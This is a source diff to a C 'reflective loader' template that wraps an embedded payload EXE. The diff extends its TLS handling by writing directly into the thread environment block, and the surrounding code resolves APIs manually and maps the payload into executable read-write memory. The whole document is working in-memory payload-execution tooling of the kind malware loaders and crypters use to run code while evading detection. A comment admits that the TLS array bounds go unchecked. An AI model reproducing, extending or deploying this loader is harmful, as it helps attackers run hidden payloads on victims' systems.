@@ -1,8 +1,8 @@
 /**
- * loader_template.c - Enhanced Reflective Loader (No Dependencies)
+ * loader_template.c - Enhanced Reflective Loader (No Dependencies, Advanced TLS support)
  *
  * This template is used to wrap a payload EXE.
- * It provides better support for exceptions (x64) and TLS.
+ * It provides better support for exceptions (x64) and TLS (including Rust runtimes).
  */
 
 #define NULL ((void*)0)
@@ -367,13 +367,16 @@ typedef LPVOID (*pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL (*pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
 typedef BOOL (*pRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);
 typedef VOID (*PIMAGE_TLS_CALLBACK)(PVOID, DWORD, PVOID);
+typedef DWORD (*pTlsAlloc)(VOID);
 
 #ifdef _MSC_VER
 #include <intrin.h>
 #ifdef _WIN64
 #define READ_PEB() (PVOID)__readgsqword(0x60)
+#define READ_TEB() (PVOID)__readgsqword(0x30)
 #else
 #define READ_PEB() (PVOID)__readfsdword(0x30)
+#define READ_TEB() (PVOID)__readfsdword(0x18)
 #endif
 #else
 #ifdef _WIN64
@@ -382,11 +385,21 @@ static __inline__ PVOID READ_PEB() {
     __asm__("mov %%gs:0x60, %0" : "=r" (peb));
     return peb;
 }
+static __inline__ PVOID READ_TEB() {
+    PVOID teb;
+    __asm__("mov %%gs:0x30, %0" : "=r" (teb));
+    return teb;
+}
 #else
 static __inline__ PVOID READ_PEB() {
     PVOID peb;
     __asm__("mov %%fs:0x30, %0" : "=r" (peb));
     return peb;
+}
+static __inline__ PVOID READ_TEB() {
+    PVOID teb;
+    __asm__("mov %%fs:0x18, %0" : "=r" (teb));
+    return teb;
 }
 #endif
 #endif
@@ -397,6 +410,12 @@ static void* my_memcpy(void* dest, const void* src, SIZE_T n) {
     const char* s = (const char*)src;
     while (n--) *d++ = *s++;
     return dest;
+}
+
+static void* my_memset(void* s, int c, SIZE_T n) {
+    unsigned char* p = (unsigned char*)s;
+    while (n--) *p++ = (unsigned char)c;
+    return s;
 }
 
 static int my_strlen(const char* s) {
@@ -563,6 +582,8 @@ void load_pe() {
     HMODULE h_kernel32 = get_module_handle_manual("kernel32.dll");
     pVirtualAlloc _VirtualAlloc = (pVirtualAlloc)get_export_address_manual(h_kernel32, "VirtualAlloc", _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);
     pVirtualProtect _VirtualProtect = (pVirtualProtect)get_export_address_manual(h_kernel32, "VirtualProtect", _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);
+    pTlsAlloc _TlsAlloc = (pTlsAlloc)get_export_address_manual(h_kernel32, "TlsAlloc", _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);
+
     PIMAGE_DOS_HEADER dos_header_raw = (PIMAGE_DOS_HEADER)pe_blob;
     PIMAGE_NT_HEADERS nt_headers_raw = (PIMAGE_NT_HEADERS)((char*)pe_blob + dos_header_raw->e_lfanew);
     LPVOID pe_buffer = _VirtualAlloc(NULL, nt_headers_raw->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -627,12 +648,44 @@ void load_pe() {
         if (_RtlAddFunctionTable) _RtlAddFunctionTable((PRUNTIME_FUNCTION)((char*)pe_buffer + exception_dir.VirtualAddress), exception_dir.Size / sizeof(RUNTIME_FUNCTION), (ULONG_PTR)pe_buffer);
     }
 #endif
+
+    // --- Advanced TLS Initialization ---
     IMAGE_DATA_DIRECTORY tls_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
     if (tls_dir.Size > 0) {
         PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)((char*)pe_buffer + tls_dir.VirtualAddress);
+
+        // 1. Allocate TLS index
+        DWORD tls_index = _TlsAlloc();
+        if (tls->AddressOfIndex) {
+            *(DWORD*)(tls->AddressOfIndex) = tls_index;
+        }
+
+        // 2. Setup TLS data for the current thread
+        SIZE_T tls_data_size = (SIZE_T)(tls->EndAddressOfRawData - tls->StartAddressOfRawData);
+        SIZE_T total_tls_size = tls_data_size + tls->SizeOfZeroFill;
+        LPVOID thread_tls_data = _VirtualAlloc(NULL, total_tls_size, MEM_COMMIT, PAGE_READWRITE);
+
+        if (thread_tls_data) {
+            my_memcpy(thread_tls_data, (const void*)tls->StartAddressOfRawData, tls_data_size);
+            my_memset((char*)thread_tls_data + tls_data_size, 0, tls->SizeOfZeroFill);
+
+            // 3. Update TEB ThreadLocalStoragePointer
+            // On x64: TEB + 0x58 points to ThreadLocalStoragePointer array
+            // On x86: TEB + 0x2C points to ThreadLocalStoragePointer array
+            void** tls_pointer_array = *(void***)((char*)READ_TEB() + (sizeof(PVOID) == 8 ? 0x58 : 0x2C));
+
+            // If the array exists and index is within reasonable bounds, set it.
+            // Note: In a real loader, we'd ensure the array is large enough.
+            if (tls_pointer_array) {
+                tls_pointer_array[tls_index] = thread_tls_data;
+            }
+        }
+
+        // 4. Run TLS Callbacks
         PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
         if (callbacks) { while (*callbacks) { (*callbacks)(pe_buffer, DLL_PROCESS_ATTACH, NULL); callbacks++; } }
     }
+
     sections = IMAGE_FIRST_SECTION(nt_headers);
     for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
         DWORD protection = 0;
